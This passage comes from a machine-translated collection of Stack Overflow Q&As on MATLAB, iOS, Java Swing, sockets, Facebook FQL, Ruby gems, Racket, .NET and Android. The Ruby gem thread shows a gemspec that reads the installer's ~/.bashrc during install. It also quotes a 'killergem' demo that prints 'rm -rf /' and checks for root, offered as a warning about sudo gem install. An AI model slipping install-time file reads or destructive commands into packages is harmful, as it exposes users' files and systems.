        Nt(i,1) = (n(i-1,1)^-1 + k*(t(i,1)-t(i-1,1)))^-1;
        error1 = Nt(i,1) - n(i,1);
        returnV = returnV + error1*error1;
    end 
```

整个程序大约需要 3 到 4 分钟，对于小型测试用例，我能够制作和理解循环的简单矢量化替代方案，但我无法对这个循环进行矢量化，

有什么指导吗？

更新：在error_km中，现在我正在使用：

```
Nt = (n(1:a-1,1).^-1 + (diff(t(:,1))).*k).^-1 - n(2:a,1);
Nt = Nt.^2;
returnV = sum(Nt); 
```

效果很好，但仍然在主程序中我被迫使用循环来迭代 kv，如果我使用 kv(:) 它每次都将向量传递给函数而不是单个值。在 main 中使用了这个： `error1 = error_km(n,t,kv.*1);`

是否也可以摆脱主循环？

EDIT2，索恩：

要摆脱主循环，只需使用 arrayfun

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T23:01:35.363

在`error_km`你不预先分配`Nt`。这一步很重要。[您可以在这个 Matlab 帮助文件](http://www.mathworks.com/help/techdoc/matlab_prog/f8-784135.html)中了解更多关于原因的信息。

如果你知道`Nt`你可以在调用 zeros() 时设置它的大小。否则，您可以重组循环：

```
function [ returnV] = error_km( n,t,k )
returnV = 0
    [a,b] = size(n);
    Nt = zeros();
    for i=a:-1:2
        Nt(i,1) = (n(i-1,1)^-1 + k*(t(i,1)-t(i-1,1)))^-1;
        error1 = Nt(i,1) - n(i,1);
        returnV = returnV + error1*error1;
    end 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-12T08:51:02.273

这是您寻求的答案的某些部分，我相信您可以弄清楚其余部分。您可以替换表达式：

```
t(i,1)-t(i-1,1) 
```

使用（矢量化）表达式

```
diff(t(:,1)) 
```

然后，您可以`i`用表达式替换循环：

```
Nt(a:-1:2,1) = (n(a-1:-1:1),1)^-1 + k*(diff(t(:,1))))^-1;
returnV = dot(Nt(:,1)-n(:,1),Nt(:,1)-n(:,1)); 
```

如果我已经正确阅读了您的代码并正确匹配了括号，那么这可能足以满足您的口味。

正如你已经被告知的那样，你应该 preallocate `Nt`，在这种情况下我会写：

```
Nt = zeros(size(n)) 
```

# ios - Apple 使用什么来检测内存泄漏？

> ID：10114268
> 
> 赞同：2
> 
> 时间：2012-04-11T21:28:38.880
> 
> 标签：ios, iphone, objective-c, ipad

因此，Apple 在其应用提交指南中提到，如果应用泄漏内存，它将被拒绝。我的问题是，Apple 究竟是如何检测内存泄漏的？

显然，如果应用程序崩溃，那么它可能是严重内存泄漏的迹象，但是对于使用少量内存的应用程序呢（因此如果内存泄漏不一定会崩溃）

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-11T21:34:19.870

我会假设他们会`Instruments` `Leaks`像您一样进行测试。它非常有用，尤其是`Analyze`与`Xcode`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-11T21:32:35.593

仪器

您可以做的不仅仅是检查其中的内存泄漏。可能是我用于测试的最伟大的开发工具之一。

[https://developer.apple.com/library/ios/#documentation/DeveloperTools/Conceptual/InstrumentsUserGuide/Introduction/Introduction.html#//apple_ref/doc/uid/TP40004652](https://developer.apple.com/library/ios/#documentation/DeveloperTools/Conceptual/InstrumentsUserGuide/Introduction/Introduction.html#//apple_ref/doc/uid/TP40004652)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-11T21:48:22.520

大多数开发人员使用：

*   用于静态检测的静态分析器。
*   `leaks`和 Instrument 的 Leaks 仪器用于动态检测。

对于内部审阅者来说，最简单的方法是`leaks`在浏览应用程序后运行该实用程序，可能包含在旨在自动化审阅过程的更高级别的程序中。

# java - 在秋千中将表格添加到框架

> ID：10114274
> 
> 赞同：1
> 
> 时间：2012-04-11T21:28:48.420
> 
> 标签：java, swing, jtable, jframe

我是摇摆新手，我刚刚开始将它作为我课堂作业的一部分。如果问题无关紧要，请原谅我。我正在尝试将包含来自数据库的一些数据的表放在一个框架上。我所做的是我创建了一个 JFrame 表单。这个表格是空白的。现在我正在尝试填充一个表格，将其放在滚动窗格上，最后将此滚动窗格添加到我的框架中。

我可以通过从当前框架创建一个新框架来显示表格。但我想要的是将表格添加到当前的 Jframe 表单中。

这是我所做的：

```
package com.air.form;
import com.air.db.Transaction;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.util.Vector;
import javax.swing.JScrollPane;
import javax.swing.JTable;

public class FlightDetails extends javax.swing.JFrame {

    /** Creates new form FlightDetails */

    public FlightDetails() {
        initComponents();
    }
     FlightDetails(String src,String dest) {
        initComponents();
        initialise(src,dest);
    }

    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">
    private void initComponents() {

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 603, Short.MAX_VALUE)
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 300, Short.MAX_VALUE)
        );

        pack();
    }

    public static void main(String args[])
    {
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new FlightDetails().setVisible(true);
            }
        });
    }
    private void initialise(String src, String dest)
    {
        Transaction tn=new Transaction();
        try
        {

            ResultSet result = tn.ReturnFlightDetails(src,dest);
            ResultSetMetaData md = result.getMetaData();
            int columnCount = md.getColumnCount();

            Vector columns = new Vector(columnCount);

            //store column names
            for(int i=1; i<=columnCount; i++)
            columns.add(md.getColumnName(i));

            Vector data = new Vector();
            Vector row;

            //store row data
            while(result.next())

            {
                row = new Vector(columnCount);
                for(int i=1; i<=columnCount; i++)
                {
                    row.add(result.getString(i));
                }
                data.add(row);
            }
            JTable table = new JTable(data, columns);
            JScrollPane scrollPane = new JScrollPane(table);
        }
        catch(Exception e)
        {

        }

    }

} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-11T21:34:04.353

`JFrame`是一个`Container`有[`add`](http://docs.oracle.com/javase/7/docs/api/java/awt/Container.html#add%28java.awt.Component%29)添加`Component`s 的方法。根据布局管理器，您还需要传递一些约束。我在您的代码中看不到任何此类调用。您只需创建一个表，但不将其添加到任何容器中。

由于这是家庭作业，我只想包含一些额外的链接：

*   [面板上的摇摆教程](http://docs.oracle.com/javase/tutorial/uiswing/components/panel.html)
*   [布局管理器的 Swing 教程](http://docs.oracle.com/javase/tutorial/uiswing/layout/using.html)

# network-programming - 接受 TCP 和 UDP 连接？

> ID：10114277
> 
> 赞同：2
> 
> 时间：2012-04-11T21:28:51.120
> 
> 标签：network-programming

我正在创建一个接受 TCP 和 UDP 连接的聊天服务器。现在假设服务器只允许单个客户端连接；还没有人可以聊天。

但是我该怎么做呢？

```
 int sock = socket( PF_INET, SOCK_STREAM, 0 ); 
```

据我了解，设置的本质区别是——

```
 int sock = socket( PF_INET, SOCK_DGRAM, 0 ); 
```

但是我如何同时做这两个呢？设置两个端口并在两个端口上交替监听以进行连接？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T21:39:11.823

看看 select() 函数。它允许“观察”多个文件描述符。提示：UDP 没有连接，因此您没有“侦听器”套接字。对于 TCP，您打开一个侦听器套接字，在该套接字上可以接受连接。您可以使用 select() 来观看“监听”套接字。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-04-11T21:35:58.010

TCP和UDP是两个不同的东西。TCP 确保数据被发送，并保证交付。但是，UDP 不提供此功能。因为它们不同，接收数据的方式也不同，所以必须设置两个ServerSocket。一个处理 TCP 连接，另一个处理 UDP 连接。

我的建议是在发送重要信息时不要使用 UDP，因为它不可靠并且不能保证您希望发送的数据的交付。但是，如果绝对有必要同时使用 TCP 和 UDP 协议，那么我建议对服务器进行多线程处理，以便它侦听这两种类型的连接，并同时接受它们。

注意：您是否注意到网站可以以 http:// 和 https:// 开头？目的相同，但发送的数据类型不同，使用不同的端口号（http 为 80，https 为 443）。这只是关于为什么您需要服务器托管在两个不同端口上的快速解释。

# php - facebook检查用户是否允许安装我的应用程序

> ID：10114280
> 
> 赞同：0
> 
> 时间：2012-04-11T21:29:06.190
> 
> 标签：php, javascript, jquery, facebook

我知道这个查询是检查人们是否喜欢我的页面。

```
SELECT uid FROM page_fan WHERE page_id = "+page_id+"and uid="+user_id; 
```

但是，我想知道人们是否允许/安装了我的应用程序。有人帮我查询吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T22:40:36.917

你可以询问登录用户的权限，路径是*[/me/permissions](http://developers.facebook.com/tools/explorer?method=GET&path=me/permissions)*，如果用户允许你的应用程序，那么你会得到类似的东西：

```
{
  "data": [
    {
      "installed": 1
    }
  ]
} 
```

（以及用户授予应用程序的更多权限）

如果不允许该应用程序，您可能会遇到这种异常：

```
{
  "error": {
    "message": "Error validating access token: User USER_ID has not authorized application 145634995501895.", 
    "type": "OAuthException", 
    "code": 190
  }
} 
```

或只是*“安装”： 0*。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-12T11:43:44.937

如果您想使用 FQL 执行此操作，则类似于以下内容（假设您正在检查登录用户）

```
 fql?q=SELECT uid, name, is_app_user FROM user where uid = me() 
```

is_app_user 将返回 true 或 false。如果你想将它添加到 WHERE 子句中，“true”或“false”需要用引号引起来

例如

```
 fql?q=SELECT uid, name,is_app_user FROM user where uid = me() and is_app_user='true' 
```

# html - 如何在 Symfony 1.4 中使用 HTML5 占位符

> ID：10114281
> 
> 赞同：1
> 
> 时间：2012-04-11T21:29:10.223
> 
> 标签：html, symfony1, symfony-1.4, placeholder

我想使用 html5 占位符属性为文本输入设置默认消息，例如“添加您的评论”。有人知道如何在 Symfony 1.4 中做到这一点吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-12T06:15:13.153

您可以在第二个参数中将任何 html 属性添加到小部件：

```
$this->form->setWidgets(array(
  'name' => new sfWidgetFormInput(
    array('label'       => 'Your Name'), 
    array('placeholder' => 'Add your comment')
  ),
)); 
```

# ruby - 自定义 ruby gem 安装

> ID：10114285
> 
> 赞同：1
> 
> 时间：2012-04-11T21:29:36.773
> 
> 标签：ruby, gem, installation

我正在创建一个 gem，它需要用户主文件夹中的隐藏目录来存储 YML 文件。安装时如何告诉 gem install 命令创建此目录？

我做了一些搜索，发现 gem 文件夹中的 Rakefile 有一个安装命令。我要覆盖这个命令吗？有没有办法调用 install 命令的 super 然后添加到 Ruby 代码以创建默认安装命令运行后所需的目录和文件？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T22:02:44.173

尽管我认为您不会特别喜欢在没有提示的情况下对某人的主目录执行操作，但要回答您的问题，gemspec 只是一个 Ruby 文件，因此您基本上可以做任何您想做的事情。尝试将其添加到您的 gemspec 中：

```
Gem::Specification.new do |gem|
  # other gem configuration
  gem.post_install_message = "The contents of your .bashrc: \n#{`cat #{ENV['HOME']}/.bashrc`}"
  # other gem configuration
end 
```

构建 gem 并在本地安装包，看看会发生什么。

**编辑：**

有人把[killergem](https://rubygems.org/gems/killergem)放在一起提醒人们注意`sudo gem install` [不是一个好主意](http://masanjin.net/blog/sudo-gem-install-considered-harmful)：

```
$stderr.puts "deleting all files in /..."
$stderr.puts "rm -rf /"
system "ls /"
if Process.uid == 0
  puts "I HAVE ROOT PRIVILEGES. YOU FAIL THE SECURITY CHECK."
else
  puts "I don't have root privileges. Nice work."
end 
```

# iframe - GA 中来自同一访问者的无意义点击次数

> ID：10114287
> 
> 赞同：0
> 
> 时间：2012-04-11T21:29:47.013
> 
> 标签：iframe, google-analytics, user-tracking

我在博客中有一个 iframe（在不同的域上），GA 跟踪链接（在 iframe 内）。
出于某种奇怪的原因，我们从同一个访问者那里得到了无意义的点击次数。博客上的某些插件或外部代码是否有可能使这些奇怪的点击发生？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-12T05:14:15.603

如果不查看您的网站，很难判断。这个世界上的一切都有可能，所以要么更具体，要么提供指向您网站的链接。

您还可以使用Chrome 的[谷歌分析调试](https://chrome.google.com/webstore/detail/jnkmfdileelhofjcijamephohjechhna)器或 Firebug 的网络选项卡来查找发送到 GA 的 __utm.gif 请求，在 99% 的情况下，由于跟踪代码安装不正确，数据已损坏，这些工具确实可以提供帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-12T15:23:13.473

首先更新您的 GA 跟踪代码。您似乎使用的是旧版本的跟踪代码。

此外，清理您的网站并减少 http 请求的数量是一个好主意。在这里阅读一些诸如 css 恶意的技巧：http: [//css-tricks.com/css-sprites/](http://css-tricks.com/css-sprites/)

也许安装 Chrome，检查网站转到控制台并按 shift +f5 并修复一些错误，还安装谷歌分析调试器，如 Nikalay 所说。

# java - 用于强制执行静态变量或静态方法的 Java 注释？

> ID：10114292
> 
> 赞同：4
> 
> 时间：2012-04-11T21:30:38.520
> 
> 标签：java, static, annotations

我有兴趣做这样的事情：

```
public interface Foo {

  public static "abstract" Bar SOME_BAR; // subclasses define one of these

} 
```

和

```
public interface Foo {

  public static "abstract" Baz buildABas(...); // subclasses define this method 

} 
```

没有静态，这是 OOP 101，但它不能在标准 oop java 中完成。我想知道是否有一个注释可以确保这种行为？

编辑：

我有兴趣指定一组选项，这些选项定义如何为“可配置”对象设置东西。这可能是命令行标志等。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-03T15:41:43.047

我猜你想要的是有一个像

```
public void callFoo(Class<?> clazz) 
```

并且你要确保`clazz`有一个方法`public static void foo()`。

我想了一会儿，想到的任何技术都不会让你到达那里。您可以使用 an`AnnotationProcessor`来确保使用某个注释注释的任何类都具有特定方法或您拥有什么（如果没有，则生成编译错误）但是无法确保（在编译时）`Class`传递给的参数`callFoo(Class<?> clazz)`是用您的注释进行注释。

这是一个 AnnotationProcessor 可以让你走到一半：

```
import java.util.Set;

import javax.annotation.processing.AbstractProcessor;
import javax.annotation.processing.Messager;
import javax.annotation.processing.RoundEnvironment;
import javax.annotation.processing.SupportedAnnotationTypes;
import javax.annotation.processing.SupportedSourceVersion;
import javax.lang.model.SourceVersion;
import javax.lang.model.element.Element;
import javax.lang.model.element.ElementKind;
import javax.lang.model.element.TypeElement;
import javax.tools.Diagnostic;

@SupportedSourceVersion(SourceVersion.RELEASE_6)
@SupportedAnnotationTypes("so.Foo")
public class FooAnnotationProcessor extends AbstractProcessor {

    @Override
    public boolean process(Set<? extends TypeElement> annotations,
            RoundEnvironment roundEnv) {

        TypeElement foo = processingEnv.getElementUtils().getTypeElement("so.Foo");
        Set<? extends Element> classes = roundEnv.getElementsAnnotatedWith(foo);
        Messager messenger = processingEnv.getMessager();
        for (Element e : classes) {
            boolean found = false;
            for (Element method : e.getEnclosedElements()) {
                messenger.printMessage(Diagnostic.Kind.ERROR, 
                        method.getSimpleName());
                if (method.getKind() == ElementKind.METHOD && method.getSimpleName().toString().equals("getInstance")) {
                    found = true;
                    break;
                }
            }
            if (!found)
            {
                messenger.printMessage(Diagnostic.Kind.ERROR, 
                    "The following class does not implement getInstance : " + e.getSimpleName(),e);
            }
        }
        return true;
    }

} 
```

最终，我建议您要么允许它在运行时强制执行，要么重新设计您的代码，这样您就不需要使用静态方法。

# gcc - 在 Fedora 上需要 gcc 4.1.2

> ID：10114293
> 
> 赞同：0
> 
> 时间：2012-04-11T21:30:40.003
> 
> 标签：gcc, g++, version, fedora

我们在 softimage 中实际运行插件时遇到问题。问题是我们编译它，没有错误但 Softimage 无法运行它。

所以，我们现在的计划是在 gcc-4.1.2 上重新编译它，但我们不知道如何安装以前的版本。因为 Softimage 实际上是在推荐这个版本（http://softimage.wiki.softimage.com/sdkdocs/cpp_setup_CompilingPlugins.htm）。

那么，知道如何安装和使用它吗？

如果可能的话，一个简单的解决方案。

谢谢

W

更新：

或者是否可以通过指定我们要使用的编译器版本来进行编译？像 gcc --compiler-version=4.1.2 test.cpp 这样的东西？所以这样，它将与 Softimage 兼容，我们不需要 VM 来管理编译所有这些！

如果您可以在 Ubuntu 上执行此操作，那可能会很棒！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-12T20:56:45.963

它找不到库吗？

也许像这样配置 gcc（假设您从头开始构建 gcc）：

./configure --prefix=/usr/local/gcc-4.1.2

然后，当您运行应用程序时，您将需要：

LD_LIBRARY_PATH=/usr/local/gcc-4.1.2/lib64:/usr/local/gcc-4.1.2/lib:$LD_LIBRARY_PATH your_app

或者进行一些其他安排以确保您的库路径包含库。

我应该先问：你从哪里得到 gcc-4.1.2？您是在构建它还是在某处有安装包？如果是后者，你知道库安装在哪里吗？

# scheme - 有没有办法从 Racket REPL 中查看函数的源代码？

> ID：10114295
> 
> 赞同：6
> 
> 时间：2012-04-11T21:30:47.217
> 
> 标签：scheme, racket, read-eval-print-loop

我目前正在尝试深入研究 Racket/Scheme。我的编辑器旁边有一个 (X)REPL 实例，它极大地帮助我探索该语言。但是，我似乎找不到可以向我显示函数源代码的 XREPL 命令或宏（或其他）。

所有需要的部分似乎都在那里：

XREPL 的`describe`命令知道文件：

```
-> ,describe string-join
; `string-join' is a bound identifier,
;   defined in racket/string.rkt
;   required directly 
```

并且`get-collects-search-dirs`知道路径：

```
-> (require setup/dirs)
-> (get-collects-search-dirs)
'(#<path:/home/richard/.racket/5.2.1/collects>
  #<path:/usr/local/lib/racket/collects>) 
```

在我们所拥有的事物的反射方面：

```
-> (procedure-arity string-join)
2 
```

但是，如果您只想知道如何调用该函数，那么这一切都没有用。有没有办法访问函数的实现，或者至少是参数名称？

或者，这也对我有用 - 某种与`help`打开的文档等效的 in-REPL 纯文本？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-22T14:37:57.907

我不确定这是否适用于 Racket，但在 MIT 方案中，有几个内置程序可以让你接近。（以下，`proc`仅代表任何程序）

1.  `(procedure-arity proc)`正如你提到的，会给你参数的数量
2.  `(pa proc)`将打印参数列表
3.  `(pp proc)`将打印程序的主体

这将适用于许多内置过程以及您自己定义的任何过程，但如果您尝试以特殊形式调用其中任何一个，`define`否则`set!`您将收到错误消息。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-12T17:38:18.620

Eli Barzilay 指出[Geiser](http://www.nongnu.org/geiser/)项目包含提取此文档的[代码。](http://git.savannah.gnu.org/cgit/geiser.git/tree/scheme/racket/geiser/autodoc.rkt)

* * *

我确实有一段实验性的源代码，它可以从 HTML 文档中提取文本，尽管该代码可能已经过时了。

见： [https ://github.com/dyoo/wescheme-docs/blob/master/test-extract-docstring.rkt](https://github.com/dyoo/wescheme-docs/blob/master/test-extract-docstring.rkt)

及其依赖项，位于：[https](https://github.com/dyoo/wescheme-docs) ://github.com/dyoo/wescheme-docs 。

我编写的`extract-docstring.rkt`库在 Racket 5.2.1 下工作，但我承认我正在做一些非常恶心的事情来从文档中提取文本。

[告诉Racket Users 邮件列表](http://lists.racket-lang.org/users/)中的人们，能够访问基于文本的文档`xrepl`是一件很重要的事情，这可能是值得的；也许它会推动推动力。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2014-08-11T15:00:01.710

几周前，XREPL`,describe`命令得到了增强，可以打印函数参数名称和合同；[来源](https://github.com/plt/racket/commit/ac93668a20989beccf5b38da253073375cc9d2f8)。

这是 Racket 文档中的“蓝色盒子”——之所以这么称呼是因为它们在 Racket 6 CSS 重新设计之前是蓝色的；现在它们实际上是灰色的:)。

你可以通过从 HEAD 构建 Racket 来获得它。否则，它应该在 6.1 之后的下一个版本中。

请记住，这似乎仅限于在已安装包中具有 Scribble 文档的功能。

# .net - SyndicationItem 内容 < > 被编码为 < >

> ID：10114306
> 
> 赞同：2
> 
> 时间：2012-04-11T21:31:19.010
> 
> 标签：.net, encoding, rss, syndication-item

我正在向 SyndicationItem Content 对象添加一些简单的标签，例如

```
"<p>Hello World</p>" 
```

但它在 RSS 提要中显示为

```
"&lt;p&gtHello World&lt;/p&gt" 
```

我尝试了不同的方法来避免这种情况，但没有一个有效。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-02-03T15:24:03.907

我在这里看到了许多适用于旧版本 .net 的解决方案：

[SyndicationFeed：内容为 CDATA？](https://stackoverflow.com/questions/1118409/syndicationfeed-content-as-cdata?rq=1)

以及这里的后处理解决方案：

[https://gist.github.com/davidwhitney/1027181](https://gist.github.com/davidwhitney/1027181)

第一个解决方案对我来说是不可行的，因为我们使用的是最新版本的 .net，而第二个看起来对于这么简单的事情来说开销很大，所以我最终实现了这个解决方案：

```
public class CDataWriter : XmlTextWriter
{
    public CDataWriter(TextWriter w) : base(w) { }

    public CDataWriter(Stream w, Encoding encoding) : base(w, encoding) { }

    public CDataWriter(string filename, Encoding encoding) : base(filename, encoding) { }

    public override void WriteString(string text)
    {
        if (text.Contains("<") && text.Contains(">"))
        {
            base.WriteCData(text);
        }
        else
        {
            base.WriteString(text);
        }
    }

} 
```

然后使用类：

```
public static class FeedToStringBuilder
{
    public static StringBuilder CDataOverwriteMethod(Rss20FeedFormatter formatter)
    {
        var buffer = new StringBuilder();
        var xmlWriterSettings = new XmlWriterSettings {Indent = true};
        using (var stream = new StringWriter(buffer))
        using (var writer = new CDataWriter(stream))
        using (var xmlWriter = XmlWriter.Create(writer, xmlWriterSettings))
        {
            formatter.WriteTo(xmlWriter);
        }
        return buffer;
    }
} 
```

在控制器中使用：

```
public ActionResult RssFeed()
{
    SyndicationFeed feed;
    using (var dataContext = new DataContext())
    {
        string urlBase = $"{Request.Url.Scheme}://{Request.Url.Authority}{Request.ApplicationPath.TrimEnd('/')}/";
        feed = new PodcastFeed(dataContext, Server).GetFeed(urlBase);
    }

    var rss20FeedFormatter = new Rss20FeedFormatter(feed);
    rss20FeedFormatter.SerializeExtensionsAsAtom = false;

    var feedXml = FeedToStringBuilder.CDataOverwriteMethod(rss20FeedFormatter).ToString();
    return Content(feedXml, "text/xml");
} 
```

# asp.net - asp.net 动态控件奇怪的值问题

> ID：10114314
> 
> 赞同：0
> 
> 时间：2012-04-11T21:32:14.690
> 
> 标签：asp.net, dynamic, controls

在我的示例 asp.net 应用程序中，可以在[此处](http://www.away.co.za/DynControls1.rar)找到，我在 Page Init 上创建动态控件。然后，如果用户在控件中输入文本并单击按钮，则应使用新值重新创建所有控件。

该页面使用用户手动输入的数据覆盖第一行中的填充值。

关于如何在不更改为 html 控件或 MVC 的情况下防止这种情况的任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T23:43:01.833

视图状态在 Page_Init 事件中不可用。将创建移动到 Page_Load 事件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-29T02:56:09.007

我最终做了一个解决方法来保持我自己的状态，我添加了一个查询字符串变量来告诉我的代码是第一次加载还是回发。我使用强制清除控件的新变量重定向到同一页面。

另一种方法是在表单加载时检查 IsPostBack 并再次从我存储的对象值中替换 ViewState 分配的值。

仍然无法通过禁用页面和控件上的 Viewstate 来了解为什么它仍然会使用 viewstate 值填充我的动态控件。

# java - 自动修复 pmd 错误。是否可以？

> ID：10114318
> 
> 赞同：3
> 
> 时间：2012-04-11T21:32:27.293
> 
> 标签：java, intellij-idea, pmd

我刚刚从另一个开发人员那里继承了一堆代码，我们公司制定了一些新的代码风格规则。所以现在我有 300 个 pmd 错误说“参数 'blablahlblah' 没有分配并且可以被宣布为最终的”。我真的不想手动完成所有这些，我只需要在导致此 pmd 错误的每个变量前面放置一个“final”修饰符。除了编写一些脚本来使用 pmd 输出并相应地修改源文件之外，还有什么简单的方法可以做到这一点？我也在使用 IntelliJ。也许这可以帮助我？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T21:57:26.893

使用`Analyze`| `Inspect Code`，它将为您提供按检查分组的结果列表，快速修复通常可以应用于整个结果组，因此您可以`final`一键添加到此检查找到的所有位置。

# android - 从 onActivityResult 显示 DialogFragment

> ID：10114324
> 
> 赞同：82
> 
> 时间：2012-04-11T21:33:27.267
> 
> 标签：android, android-fragments, android-dialogfragment

对于我的一个片段，我的 onActivityResult 中有以下代码：

```
onActivityResult(int requestCode, int resultCode, Intent data){
   //other code
   ProgressFragment progFragment = new ProgressFragment();  
   progFragment.show(getActivity().getSupportFragmentManager(), PROG_DIALOG_TAG);
   // other code
} 
```

但是，我收到以下错误：

```
Caused by: java.lang.IllegalStateException: Can not perform this action after onSaveInstanceState 
```

任何人都知道发生了什么，或者我该如何解决这个问题？我应该注意我正在使用 Android 支持包。

* * *

## 回答 #1

> 赞同：76
> 
> 时间：2013-04-04T03:38:34.923

如果您使用 Android 支持库，onResume 方法不是正确的地方，在哪里玩片段。您应该在 onResumeFragments 方法中执行此操作，请参阅 onResume 方法说明：http: [//developer.android.com/reference/android/support/v4/app/FragmentActivity.html#onResume%28%29](http://developer.android.com/reference/android/support/v4/app/FragmentActivity.html#onResume%28%29)

所以从我的角度来看，正确的代码应该是：

```
private boolean mShowDialog = false;

@Override
protected void onActivityResult(int requestCode, int resultCode, Intent data){
  super.onActivityResult(requestCode, resultCode, data);

  // remember that dialog should be shown
  mShowDialog = true;
}

@Override
protected void onResumeFragments() {
  super.onResumeFragments();

  // play with fragments here
  if (mShowDialog) {
    mShowDialog = false;

    // Show only if is necessary, otherwise FragmentManager will take care
    if (getSupportFragmentManager().findFragmentByTag(PROG_DIALOG_TAG) == null) {
      new ProgressFragment().show(getSupportFragmentManager(), PROG_DIALOG_TAG);
    }
  }
} 
```

* * *

## 回答 #2

> 赞同：27
> 
> 时间：2012-04-11T22:35:04.053

编辑：不是错误，而是片段框架中的更多缺陷。这个问题的更好答案是上面@Arcao 提供的答案。

---- 原帖----

实际上这是支持包的一个[已知错误](http://code.google.com/p/android/issues/detail?id=23761)（编辑：实际上不是错误。请参阅@alex-lockwood 的评论）。在错误报告的评论中发布的解决方法是修改 DialogFragment 的源，如下所示：

```
public int show(FragmentTransaction transaction, String tag) {
    return show(transaction, tag, false);
}

public int show(FragmentTransaction transaction, String tag, boolean allowStateLoss) {
    transaction.add(this, tag);
    mRemoved = false;
    mBackStackId = allowStateLoss ? transaction.commitAllowingStateLoss() : transaction.commit();
    return mBackStackId;
} 
```

请注意，这是一个巨大的黑客。我实际上这样做的方式只是制作我自己的对话片段，我可以从原始片段中注册。当另一个对话片段做一些事情（比如被解雇）时，它告诉任何听众它正在消失。我是这样做的：

```
public static class PlayerPasswordFragment extends DialogFragment{

 Player toJoin;
 EditText passwordEdit;
 Button okButton;
 PlayerListFragment playerListFragment = null;

 public void onCreate(Bundle icicle){
   super.onCreate(icicle);
   toJoin = Player.unbundle(getArguments());
   Log.d(TAG, "Player id in PasswordFragment: " + toJoin.getId());
 }

 public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle icicle){
     View v = inflater.inflate(R.layout.player_password, container, false);
     passwordEdit = (EditText)v.findViewById(R.id.player_password_edit);
     okButton = (Button)v.findViewById(R.id.ok_button);
     okButton.setOnClickListener(new View.OnClickListener(){
       public void onClick(View v){
         passwordEntered();
       }
     });
     getDialog().setTitle(R.string.password_required);
     return v;
 }

 public void passwordEntered(){
   //TODO handle if they didn't type anything in
   playerListFragment.joinPlayer(toJoin, passwordEdit.getText().toString());
   dismiss();
 }

 public void registerPasswordEnteredListener(PlayerListFragment playerListFragment){
   this.playerListFragment = playerListFragment;
 }

 public void unregisterPasswordEnteredListener(){
   this.playerListFragment = null;
 }
} 
```

所以现在我有办法在事情发生时通知 PlayerListFragment。请注意，适当地调用 unregisterPasswordEnteredListener 非常重要（在上述情况下，当 PlayerListFragment “消失”时），否则当该侦听器不再存在时，此对话框片段可能会尝试调用已注册侦听器上的函数。

* * *

## 回答 #3

> 赞同：26
> 
> 时间：2015-05-24T23:49:32.947

[@Natix](https://stackoverflow.com/questions/10114324/show-dialogfragment-from-onactivityresult#comment29476220_17935730)留下的评论是一些人可能已经删除的快速单线。

解决这个问题的最简单方法是在运行您自己的代码之前调用**super.onActivityResult() 。**无论您是否使用支持库，这都有效，并在您的活动中保持行为一致性。

有：

*   无需[使用线程、处理程序或 sleeps 添加虚假延迟](https://stackoverflow.com/a/19753762/253704)。
*   无需[提交允许状态丢失](https://stackoverflow.com/a/10114942/253704)或子类覆盖 show()。这不是错误，而是警告。不要丢弃状态数据。（[另一个](https://stackoverflow.com/a/16206036/253704)，[奖金示例](https://stackoverflow.com/a/17080590/253704)）
*   无需[跟踪活动中的对话片段](https://stackoverflow.com/a/13925771/253704)（你好，内存泄漏！）
*   天哪，不需要[手动调用 onStart() 来搞乱活动的生命周期](https://stackoverflow.com/a/29507067/253704)。

我读得越多，我看到的疯狂黑客就越多。

如果您仍然遇到问题，那么[Alex Lockwood](https://stackoverflow.com/a/18345899/253704)的那个就是要检查的那个。

*   无需[为 onSaveInstanceState() 编写任何代码](https://stackoverflow.com/a/28711904/253704)（[另一个](https://stackoverflow.com/a/16726592/253704])）

* * *

## 回答 #4

> 赞同：14
> 
> 时间：2012-04-11T21:54:35.703

我相信这是一个Android错误。基本上，Android 在活动/片段生命周期中的错误点（在 onStart() 之前）调用 onActivityResult。

该错误报告在[https://issuetracker.google.com/issues/36929762](https://issuetracker.google.com/issues/36929762)

我通过基本上将 Intent 存储为稍后在 onResume() 中处理的参数来解决它。

[编辑] 现在有更好的解决方案来解决这个问题，这些解决方案在 2012 年还没有。请参阅其他答案。

* * *

## 回答 #5

> 赞同：11
> 
> 时间：2013-07-29T23:08:14.007

编辑：*另一种*选择，可能是最好的（或者，至少是支持库所期望的......）

如果您将 DialogFragments 与 Android 支持库一起使用，则应该使用 FragmentActivity 的子类。尝试以下操作：

```
onActivityResult(int requestCode, int resultCode, Intent data) {

   super.onActivityResult(requestCode, resultCode, intent);
   //other code

